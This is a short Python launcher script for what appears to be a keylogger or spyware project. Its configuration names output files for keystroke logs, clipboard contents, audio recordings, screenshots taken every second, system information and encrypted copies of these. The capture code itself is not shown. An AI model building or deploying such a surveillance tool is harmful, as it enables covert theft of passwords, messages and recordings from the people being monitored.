from src.domain.config import Config
from src.applications.common.logger_handler import Logger
from src.main import Main


config: Config = {
    "FILE_PATH": "./output",
    "EXTEND": "/",  # on windows use "\\",
    "ENCRYPT_KEY": "",
    "SYSTEM_INFORMATION": "syseminfo.txt",
    "CLIPBOARD_INFORMATION": "clipboard.txt",
    "AUDIO_INFORMATION": "audio.wav",
    "SCREENSHOT_INTERVAL": 1,
    "SCREENSHOT_INFORMATION": "screenshot.png",
    "KEYS_INTERVAL": 1,
    "KEYS_INFORMATION": "key_log.txt",
}


if __name__ == "__main__":
    Main(config, logger=Logger("Main"))


"""
"AUDIO_INFORMATION_E": "e_audio.wav",
"SYSTEM_INFORMATION_E": "e_systeminfo.txt",
"CLIPBOARD_INFORMATION_E": "e_clipboard.txt",
"SCREENSHOT_INFORMATION_E": "e_screenshot.png",
"KEYS_INFORMATION_E": "e_key_log.txt",
"""
